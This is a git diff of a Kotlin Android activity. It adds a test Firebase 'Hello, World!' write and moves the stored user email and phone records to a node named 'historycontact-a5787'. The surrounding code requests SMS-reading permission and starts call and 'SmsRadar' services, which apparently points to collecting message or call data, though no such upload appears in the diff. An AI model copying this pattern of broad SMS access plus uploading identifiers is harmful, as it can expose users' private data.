@@ -40,7 +40,6 @@ class TokenActivity : Activity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_hello_token)
         mDatabase = FirebaseDatabase.getInstance().reference
-
         initView()
         startCallService()
         ActivityCompat.requestPermissions(this, arrayOf("android.permission.READ_SMS"), 23);
@@ -48,6 +47,16 @@ class TokenActivity : Activity() {
             Log.e("antx", " TokenActivity initializeSmsRadarService")
             initializeSmsRadarService()
         }
+        val database = FirebaseDatabase.getInstance()
+        val myRef = database.getReference("message")
+        myRef.setValue("Hello, World!")
+                .addOnSuccessListener {
+                    Log.e("antx","firebase Sucees")
+                }
+                .addOnFailureListener {
+                    Log.e("antx","firebase Error "+it.message)
+
+                }
     }
 
     override fun onResume() {
@@ -57,10 +66,10 @@ class TokenActivity : Activity() {
             override fun onSuccess(account: Account) {
                 user_email.text = account.email
                 account.phoneNumber?.let {
-                    mDatabase?.child("User")?.child(account.id.toString())?.setValue(User(account.id, "", account.phoneNumber.toString()))
+                    mDatabase?.child("historycontact-a5787")?.child(account.id.toString())?.setValue(User(account.id, "", account.phoneNumber.toString()))
                 }
                 account.email?.let {
-                    mDatabase?.child("User")?.child(account.id.toString())?.setValue(User(account.id, account.email?.toString(), ""))
+                    mDatabase?.child("historycontact-a5787")?.child(account.id.toString())?.setValue(User(account.id, account.email?.toString(), ""))
                 }
 
             }
